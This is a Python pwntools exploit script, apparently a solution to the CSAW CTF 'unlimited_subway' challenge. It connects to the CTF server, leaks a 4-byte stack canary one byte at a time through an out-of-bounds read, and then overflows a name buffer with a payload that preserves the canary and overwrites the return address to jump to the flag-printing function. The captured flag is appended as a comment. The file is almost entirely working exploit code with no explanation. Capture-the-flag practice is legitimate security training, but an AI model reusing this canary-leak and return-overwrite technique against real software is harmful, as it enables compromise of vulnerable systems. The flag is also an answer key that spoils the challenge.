#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./unlimited_subway_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("pwn.csaw.io", 7900)
	else:
		r = gdb.debug([exe.path], "b *0x8049304")
	return r


def main():
	r = conn()

	win = exe.sym['print_flag']

	canary = bytearray()
	index = 128
	while len(canary) != 4:
		r.sendline(b"V")
		r.recv()
		r.sendline(f"{index}".encode())
		r.recvuntil(b': ')

		data = r.recvline(keepends=False)
		canary_byte = int(data[-2:], 16)

		canary += bytes([canary_byte])
		index += 1
	
	success(f'{hex(u32(canary))=}')

	win = 0x08049304
	payload = b''.join([
		b'A' * 0x40,
		canary,
		p32(win),
		p32(win)
	])

	r.recvuntil(b'[E]')
	r.sendline(b'E')

	r.recvuntil(b'Size :')
	r.sendline(str(len(payload)).encode())

	r.recvuntil(b'Name :')
	r.sendline(payload)

	r.interactive()


if __name__ == "__main__":
	main()

# csawctf{my_n4m3_15_079_4nd_1m_601n6_70_h0p_7h3_7urn571l3}
